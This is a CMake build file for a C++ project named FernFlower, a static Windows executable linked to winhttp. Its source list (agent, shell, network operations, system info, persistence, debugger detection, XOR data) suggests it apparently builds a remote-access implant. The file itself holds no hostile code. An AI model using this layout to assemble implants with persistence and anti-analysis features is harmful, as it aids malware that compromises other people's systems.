cmake_minimum_required(VERSION 3.26)
project(FernFlower)

# Set the C++ standard to C++20
set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

# Compiler flags
set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -Wall -static -static-libgcc -static-libstdc++")
set(CMAKE_CXX_FLAGS_DEBUG "-g")
set(CMAKE_CXX_FLAGS_RELEASE "-O3")

# Include directories
include_directories(include)

# Enable testing
enable_testing()
add_subdirectory(tests)

# Define the source files and headers for the project
set(SOURCE_FILES
        main.cpp
        Source/network_operations.cpp
        Source/shell.cpp
        Source/agent.cpp
        Source/systeminfo.cpp
        Source/persistance.cpp
        Source/is_debugger_present.cpp
        Source/xor_data.cpp)

set(HEADER_FILES
        Include/network_operations.h
        Include/shell.h
        Include/agent.h
        Include/systeminfo.h
        Include/config.h
        Include/persistance.h
        Include/is_debugger_present.h
        Include/xor_data.h
)

# Add the executable
add_executable(FernFlower ${SOURCE_FILES} ${HEADER_FILES})

# Link libraries
target_link_libraries(FernFlower winhttp)
